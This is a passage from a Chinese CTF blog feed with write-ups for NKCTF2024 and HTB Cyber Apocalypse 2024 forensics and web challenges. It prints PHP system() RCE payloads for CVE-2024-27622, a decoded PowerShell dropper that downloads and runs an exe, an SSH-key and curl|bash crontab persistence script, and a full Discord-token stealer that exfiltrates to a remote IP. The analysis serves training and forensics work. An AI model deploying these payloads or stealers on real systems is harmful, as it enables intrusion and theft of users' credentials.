encoding=&#39;utf-8&#39;)        else:            return jsonify(&#123;&#39;error&#39;: &#39;Please select a font file.&#39;&#125;), 400                H = 60        W = 30        canvas = Image.new(&#39;RGB&#39;, (W * len(secret), H), (255, 255, 255))        pen = ImageDraw.Draw(canvas)        pen.text((0, 0), secret, &#39;black&#39;, font)        original_canvas = canvas.copy()        for i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)                original_img_base64 = image_to_base64(original_canvas)        secret_img_base64 = image_to_base64(canvas)                return jsonify(&#123;&#39;original_image&#39;: original_img_base64, &#39;secret_image&#39;: secret_img_base64&#125;)    except Exception as e:        print(&quot;An error occurred:&quot;, e)        return jsonify(&#123;&#39;error&#39;: &#39;Internal Server Error&#39;&#125;), 500</code></pre><p>其中关键的就是</p><pre><code class="python">secret = &#39;pass &#39; + secretfor i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>他读取了我们输入的内容作为<code>secret</code>的值 但是还在前面加了<code>pass </code> 同时将secret的内容从第五个字符到倒数第二个字符这部分内容打上马赛克</p><p>我们对代码进行修改 删掉<code>secret = &#39;pass &#39; + secret</code></p><pre><code>for i in range(len(secret)):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>在尝试一下输入<code>ABCDEFG</code> 发现输出的图片上就只有<code>ABCDEFG</code>了 并且会全部被打上马赛克</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257248.png" alt="image-20240328125714210"></p><p>下面就是生成字典图片 输入<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257085.png" alt="image-20240328125746993"></p><p>然后我们将字典图片和pass.png都按字符进行分割 直接调gpt就行 </p><pre><code>帮我按照以下要求 写一段代码 我现在有一个1860*60的图片 请你帮我分割成30*60的小图片 放进dict文件夹中 命名规则按照如下顺序ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789  一共是62张小图片 最后 如果文件名为大写字母则为 “文件名-大写.png”</code></pre><pre><code class="python">from PIL import Imageimport osdef split_image(image_path, output_folder, width=30, height=60):    image = Image.open(image_path)    image_width, image_height = image.size    if image_width % width != 0 or image_height % height != 0:        print(&quot;Error: Invalid dimensions for splitting.&quot;)        return    num_columns = image_width // width    num_rows = image_height // height    if not os.path.exists(output_folder):        os.makedirs(output_folder)    chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;    char_index = 0    for col in range(num_columns):        for row in range(num_rows):            left = col * width            upper = row * height            right = left + width            lower = upper + height            cropped_image = image.crop((left, upper, right, lower))                        char = chars[char_index]            if char.isupper():                filename = f&quot;&#123;char&#125;-大写.png&quot;            else:                filename = f&quot;&#123;char&#125;.png&quot;                            cropped_image.save(os.path.join(output_folder, filename))            char_index += 1if __name__ == &quot;__main__&quot;:    input_image_path = &quot;dict2.png&quot; # 某段flag/pass.png    output_folder = &quot;dict1&quot;        # dict2    split_image(input_image_path, output_folder)</code></pre><p>然后就是利用哈希计算和字典 匹配出pass.png中的密码</p><pre><code class="python">import osimport hashlibdef calculate_hashes(folder):    hash_dict = &#123;&#125;    for filename in os.listdir(folder):        filepath = os.path.join(folder, filename)        if os.path.isfile(filepath):            with open(filepath, &#39;rb&#39;) as f:                image_data = f.read()                hash_value = hashlib.md5(image_data).hexdigest()                hash_dict[filename[:-4:]] = hash_value    return hash_dictdef find_matching_images(dict1, dict2):    matches = []    for filename, hash_value in dict2.items():        if hash_value in dict1.values():            matching_filename = [name for name, hash_val in dict1.items() if hash_val == hash_value][0]            matches.append(matching_filename)    return matchesif __name__ == &quot;__main__&quot;:    dict1_folder = &quot;dict1&quot;     dict2_folder = &quot;dict2&quot;     dict1_hashes = calculate_hashes(dict1_folder)    dict2_hashes = calculate_hashes(dict2_folder)    matching_images = find_matching_images(dict1_hashes, dict2_hashes)        print(&quot;Matching images found in dict1:&quot;)    for image in matching_images:        print(image)&#39;&#39;&#39;Matching images found in dict1:b143a6268e2a23&#39;&#39;&#39;</code></pre><p>dict2中14个被打马赛克的字符匹配出来的结果是<code>b143a6268e2a23</code>  再加上原来没有被打马赛克的字符 VC容器的密码就是<code>b143a6268e2a233</code>  直接进行挂载 得到flag3</p><pre><code>c4f222879312</code></pre><p>组合起来就是</p><pre><code>nkctf&#123;39c429eb-2faf49a0-bd24-c4f222879312&#125;</code></pre><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="my-first-cms-CVE-2024-27622"><a href="#my-first-cms-CVE-2024-27622" class="headerlink" title="my first cms(CVE-2024-27622)"></a>my first cms(CVE-2024-27622)</h3><p>首先dirsearch扫目录 扫到后台登陆页面<code>admin/login.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242112791.png" alt="image-20240324211243701"></p><p>抓个包开始爆破登陆密码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242115397.png" alt="image-20240324211527287"></p><p>比较抽象是<code>admin/Admin123</code> 登陆后台 </p><p>注意到这个<code>CMSMadeSimple</code>框架的版本是2.2.19  搜一波漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242120123.png" alt="image-20240324212044011"></p><p><a href="https://github.com/capture0x/CMSMadeSimple">CVE-2024-27622</a></p><p>直接进行利用 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242122358.png" alt="image-20240324212227274"></p><p> 先抓<code>&lt;?php echo system(&#39;id&#39;); ?&gt;</code>测试一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242123611.png" alt="image-20240324212348525"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242124243.png" alt="image-20240324212408092"></p><p>成功回显 再看一下根目录 </p><pre><code>&lt;?php system(&quot;ls /&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242127820.png" alt="image-20240324212741748"></p><p>读取flag</p><pre><code>&lt;?php system(&quot;cat /_fffff1@g&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242128199.png" alt="image-20240324212836091"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NKCTF2024&quot;&gt;&lt;a href=&quot;#NKCTF2024&quot; class=&quot;headerlink&quot; title=&quot;NKCTF2024&quot;&gt;&lt;/a&gt;NKCTF2024&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>HTBCyberCTF2024</title>
    <link href="http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/"/>
    <id>http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/</id>
    <published>2024-03-16T11:52:36.682Z</published>
    <updated>2024-03-30T02:57:25.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTBCyberCTF2024"><a href="#HTBCyberCTF2024" class="headerlink" title="HTBCyberCTF2024"></a>HTBCyberCTF2024</h1><h2 id="Forensics-部分"><a href="#Forensics-部分" class="headerlink" title="Forensics(部分)"></a>Forensics(部分)</h2><h3 id="Urgent"><a href="#Urgent" class="headerlink" title="Urgent"></a>Urgent</h3><p>给的附件是一个xml文件 直接notepad打开 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111402394.png" alt="image-20240311140231315"></p><p>解base64</p><pre><code>document.write(unescape(&#39;&gt;_ 404 Not FoundSub window_onloadconst impersonation = 3Const HIDDEN_WINDOW = 12Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)Set Service = Locator.ConnectServer()Service.Security_.ImpersonationLevel=impersonationSet objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)Set objConfig = objStartup.SpawnInstance_Set Process = Service.Get(&quot;Win32_Process&quot;)Error = Process.Create(&quot;cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&#39;https://standunited.htb/online/forms/form1.exe&#39;,&#39;%appdata%\form1.exe&#39;);Start-Process &#39;%appdata%\form1.exe&#39;;$flag=&#39;HTB&#123;4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT&#125;&quot;, null, objConfig, intProcessID)window.close()end sub&#39;));</code></pre><p>拿到flag</p><h3 id="It-Has-Begun"><a href="#It-Has-Begun" class="headerlink" title="It Has Begun"></a>It Has Begun</h3><pre><code>The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.</code></pre><p>直接仔细翻看给的script.sh  找到两段关键的</p><pre><code>echo &quot;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w&#123;BTH&quot; &gt;&gt; /root/.ssh/authorized_keysecho &quot;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &quot; &gt;&gt; /etc/crontab</code></pre><p>第一段flag</p><pre><code>HTB&#123;w1ll_y0u_St</code></pre><p>第二段是解base64<code>NG5kX3kwdVJfR3IwdU5kISF9</code></p><pre><code>4nd_y0uR_Gr0uNd!!&#125;</code></pre><h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><pre><code>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!随着准备工作的结束，以及 The Fray 的临近，我们新成立的团队已经开始为比赛重构新的 CMS 应用程序。然而，一段时间后，我们注意到我们的很多工作都神秘地消失了！我们设法从有问题的开发服务器中提取了 SSH 日志和 Bash 历史记录。设法发现肇事者的派系将获得巨大的奖金！</code></pre><p>使用nc连接docker容器 </p><p>第一个问题</p><pre><code>What is the IP Address and Port of the SSH Server (IP:PORT)</code></pre><p>问的是通过ssh连接的ip和端口是什么 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151122502.png" alt="image-20240315112236452"></p><p>看到第三行的连接记录 前面的ip和端口是发起连接的 后面的ip和端口是连接的目标 后面的记录都是如此 那后面的ip和端口就是想通过ssh进行连接的ip和端口</p><pre><code>100.107.36.130:2221</code></pre><p>第二个问题</p><pre><code>What time is the first successful Login</code></pre><p>问的是第一次成功连接的时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151126225.png" alt="image-20240315112617183"></p><p>可以看到第一次连接是失败了 第二次连接成功 那第二次连接就是第一次成功连接 </p><pre><code>2024-02-13 11:29:50</code></pre><p>第三个问题</p><pre><code>What is the time of the unusual Login</code></pre><p>问的是非常规登陆的时间 </p><p>这里可能问的是特殊ip的登陆  只有一个特殊ip<code>2.67.182.119</code> 看着很像挖矿病毒或者攻击者的外部ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151603252.png" alt="image-20240315160355183"></p><pre><code>2024-02-19 04:00:14</code></pre><p>第四个问题</p><pre><code>What is the Fingerprint of the attacker&#39;s public key</code></pre><p>承接上一题 </p><pre><code>OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4</code></pre><p>第五个问题</p><pre><code>What is the first command the attacker executed after logging in</code></pre><p>问的是攻击者在登陆之后执行的第一个命令是什么</p><p>看<code>bash_history.txt</code> 由第三个问题知道攻击者是在<code>2024-02-19 04:00:14</code>之后登陆的 直接找这个时间对应的命令记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151615339.png" alt="image-20240315161550301"></p><pre><code>whoami</code></pre><p>第六个问题</p><pre><code>What is the final command the attacker executed before logging out</code></pre><p>问的是攻击者在登陆注销前执行的最后一个命令是什么</p><p>看<code>sshd.log</code> 攻击者是在<code>2024-02-19 04:38:17</code> 进行注销的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151618823.png" alt="image-20240315161830759"></p><p>再在<code>bash_history.txt</code>里面看看这个时间前执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151619193.png" alt="image-20240315161928153"></p><pre><code>./setup</code></pre><p>然后就可以拿到flag</p><pre><code>HTB&#123;B3sT_0f_luck_1n_th3_Fr4y!!&#125;</code></pre><h3 id="Fake-Boost"><a href="#Fake-Boost" class="headerlink" title="Fake Boost"></a>Fake Boost</h3><pre><code>In the shadow of The Fray, a new test called &quot;&quot;Fake Boost&quot;&quot; whispers promises of free Discord Nitro perks. It&#39;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.</code></pre><p>在流量包中提取出来一个文件<code>freediscordnitro</code> 查看内容 发现是对一个字符串的处理 </p><pre><code>$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2&gt;&amp;1&gt; $null ;$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing(&quot;$s0yAY2gmHVNFd7QZ&quot;)) ;</code></pre><p>先是将字符串进行反转 然后在解base64 </p><pre><code>$URL = &quot;http://192.168.116.135:8080/rj1893rj1joijdkajwda&quot;function Steal &#123;    param (        [string]$path    )    $tokens = @()    try &#123;        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object &#123;                        try &#123;                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop                foreach ($regex in @(&#39;[\w-]&#123;26&#125;\.[\w-]&#123;6&#125;\.[\w-]&#123;25,110&#125;&#39;, &#39;mfa\.[\w-]&#123;80,95&#125;&#39;)) &#123;                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object &#123;                        $_.Matches.Value                    &#125;                &#125;            &#125; catch &#123;&#125;        &#125;    &#125; catch &#123;&#125;    return $tokens&#125;function GenerateDiscordNitroCodes &#123;    param (        [int]$numberOfCodes = 10,        [int]$codeLength = 16    )    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;    $codes = @()    for ($i = 0; $i -lt $numberOfCodes; $i++) &#123;        $code = -join (1..$codeLength | ForEach-Object &#123; Get-Random -InputObject $chars.ToCharArray() &#125;)        $codes += $code    &#125;    return $codes&#125;function Get-DiscordUserInfo &#123;    [CmdletBinding()]    Param (        [Parameter(Mandatory = $true)]        [string]$Token    )    process &#123;        try &#123;            $Headers = @&#123;                &quot;Authorization&quot; = $Token                &quot;Content-Type&quot; = &quot;application/json&quot;                &quot;User-Agent&quot; = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&quot;            &#125;            $Uri = &quot;https://discord.com/api/v9/users/@me&quot;            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers            return $Response        &#125;        catch &#123;&#125;    &#125;&#125;function Create-AesManagedObject($key, $IV, $mode) &#123;    $aesManaged = New-Object &quot;System.Security.Cryptography.AesManaged&quot;    if ($mode=&quot;CBC&quot;) &#123; $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC &#125;    elseif ($mode=&quot;CFB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB&#125;    elseif ($mode=&quot;CTS&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS&#125;    elseif ($mode=&quot;ECB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB&#125;    elseif ($mode=&quot;OFB&quot;)&#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB&#125;    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7    $aesManaged.BlockSize = 128    $aesManaged.KeySize = 256    if ($IV) &#123;        if ($IV.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.IV = [System.Convert]::FromBase64String($IV)        &#125;        else &#123;            $aesManaged.IV = $IV        &#125;    &#125;    if ($key) &#123;        if ($key.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.Key = [System.Convert]::FromBase64String($key)        &#125;        else &#123;            $aesManaged.Key = $key        &#125;    &#125;    $aesManaged&#125;function Encrypt-String($key, $plaintext) &#123;    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)    $aesManaged = Create-AesManagedObject $key    $encryptor = $aesManaged.CreateEncryptor()    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);    [byte[]] $fullData = $aesManaged.IV + $encryptedData    [System.Convert]::ToBase64String($fullData)&#125;Write-Host &quot;______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ |  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   || |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `&#39; / /&#39;| |/&#39; |`&#39; / /&#39;/ /| ||  _| &#39;__/ _ \/ _ \ | | | | / __|/ __/ _ \| &#39;__/ _` | | . ` | | __| &#39;__/ _ \    / /  |  /| |  / / / /_| || | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/                                                                                                                                                                                                                  &quot;Write-Host &quot;Generating Discord nitro keys! Please be patient...&quot;$local = $env:LOCALAPPDATA$roaming = $env:APPDATA$part1 = &quot;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&quot;$paths = @&#123;    &#39;Google Chrome&#39; = &quot;$local\Google\Chrome\User Data\Default&quot;    &#39;Brave&#39; = &quot;$local\BraveSoftware\Brave-Browser\User Data\Default\&quot;    &#39;Opera&#39; = &quot;$roaming\Opera Software\Opera Stable&quot;    &#39;Firefox&#39; = &quot;$roaming\Mozilla\Firefox\Profiles&quot;&#125;$headers = @&#123;    &#39;Content-Type&#39; = &#39;application/json&#39;    &#39;User-Agent&#39; = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#39;&#125;$allTokens = @()foreach ($platform in $paths.Keys) &#123;    $currentPath = $paths[$platform]    if (-not (Test-Path $currentPath -PathType Container)) &#123;continue&#125;    $tokens = Steal -path $currentPath    $allTokens += $tokens&#125;$userInfos = @()foreach ($token in $allTokens) &#123;    $userInfo = Get-DiscordUserInfo -Token $token    if ($userInfo) &#123;        $userDetails = [PSCustomObject]@&#123;            ID = $userInfo.id            Email = $userInfo.email            GlobalName = $userInfo.global_name            Token = $token        &#125;        $userInfos += $userDetails    &#125;&#125;$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;$payload = $userInfos | ConvertTo-Json -Depth 10$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payloadtry &#123;    $headers = @&#123;        &#39;Content-Type&#39; = &#39;text/plain&#39;        &#39;User-Agent&#39; = &#39;Mozilla/5.0&#39;    &#125;    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData&#125;catch &#123;&#125;Write-Host &quot;Success! Discord Nitro Keys:&quot;$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16$keys | ForEach-Object &#123; Write-Output $_ &#125;</code></pre><p>找到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908010.png" alt="image-20240311190848912"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908936.png" alt="image-20240311190856886"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_</code></pre><p>流量包里面还有一个文件<code>rj1893rj1joijdkajwda</code> </p><pre><code>bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==</code></pre><p>不能直接解base64 应该是aes解密 需要找密钥  密钥其实也在上面解base64之后的字符串里面 </p><pre><code>$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;</code></pre><p>需要解一下base64 </p><pre><code>cWphrNTk9wgWZ93t19jayqnlaDuIeFKi</code></pre><p>这个有点特殊  是CBC模式的解密  但是没有偏移值 好像只有这个网站可以做到</p><p><a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES解密</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151103552.png" alt="image-20240315110356503"></p><pre><code>ui(wyXØU(î6Nx[    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;,    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;]</code></pre><p>里面的 <code>Email</code> 部分再解base64就是flag2</p><pre><code>b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151106059.png" alt="image-20240315110637977"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><p>先看协议分级  主要是tcp协议</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122000172.png" alt="image-20240312200010100"></p><p>直接追踪tcp流  看到从第一个包开始 奇数包都传输了一个压缩包 密码直接在包中显示出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122002053.png" alt="image-20240312200230965"></p><p>一共有15个这样的压缩包  将字符串提取出来 先解base64 在另存为压缩包 使用相应的密码进行解压 观察第一个解压的文件 应该是一个pdf文件 分成了15个部分 最后将这15个文件全部进行拼接 得到完整的pdf文件 在末尾找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122042924.png" alt="image-20240312204207845"></p><h3 id="data-siege"><a href="#data-siege" class="headerlink" title="data_siege"></a>data_siege</h3><pre><code>&quot;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city&#39;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.&quot;</code></pre><p>题干告诉我们flag分为三部分 </p><p>附件是一个流量包  看了一眼协议分级  主要是TCP协议的流量包</p><p>看一下可以导出的HTTP对象 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141055864.png" alt="image-20240314105505835"></p><p>将这个<code>aQ4caZ.exe</code> 导出 直接放在010里面看 找到一部分字符串 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141056081.png" alt="image-20240314105640043"></p><pre><code>Very_S3cr3t_S</code></pre><p>开始以为这是一部分flag  后来发现这个不是 是AES加密密钥的盐值</p><p>追踪tcp流 在第五个包发现好像是base64的字符串 解一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141102380.png" alt="image-20240314110226319"></p><p>看到flag part3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141103418.png" alt="image-20240314110335330"></p><p>但是数据很乱  应该是前面有混淆字符 整理一下 重新解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141105217.png" alt="image-20240314110525109"></p><pre><code>0r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><p>到这一步 第五个包剩下的部分应该还是要进行解密 猜测是AES解密 但是解密密钥偏移值等信息 就是要分析上面提取出来的exe程序 进行逆向  这边要使用dnspy进行调试分析 </p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnspy下载安装</a></p><p>直接使用dnspy将<code>aQ4caZ.exe</code>打开 可以看到这个程序原本的名字是<code>EZRATClient</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161648741.png" alt="image-20240316164845657"></p><p>找到解密函数 </p><pre><code class="c#">public static string Decrypt(string cipherText)&#123;    string result;    try    &#123;        string encryptKey = Constantes.EncryptKey;        byte[] array = Convert.FromBase64String(cipherText);        using (Aes aes = Aes.Create())        &#123;            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]            &#123;                86,                101,                114,                121,                95,                83,                51,                99,                114,                51,                116,                95,                83            &#125;);            aes.Key = rfc2898DeriveBytes.GetBytes(32);            aes.IV = rfc2898DeriveBytes.GetBytes(16);            using (MemoryStream memoryStream = new MemoryStream())            &#123;                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                &#123;                    cryptoStream.Write(array, 0, array.Length);                    cryptoStream.Close();                &#125;                cipherText = Encoding.Default.GetString(memoryStream.ToArray());            &#125;        &#125;        result = cipherText;    &#125;    catch (Exception ex)    &#123;        Console.WriteLine(ex.Message);        Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);        result = &quot;error&quot;;    &#125;    return result;&#125;</code></pre><p>里面提到的这个<code>encryptKey</code>  可以在下面找到<code>EZRATClient.Core--Constantes--_encryptKey</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161703743.png" alt="image-20240316170317697"></p><pre><code>VYAemVeO3zUDTL6N62kVA</code></pre><p>那解密函数在程序里面已经给了 需要用到的密钥也给了 只是这段解密代码缺少一部分对密文的输出和对解密 补上就可以</p><pre><code class="c#">using System;using System.IO;using System.Security.Cryptography;using System.Text;public static class Program&#123;    public static void Main(string[] args)    &#123;        // 测试解密方法        string cipherText = 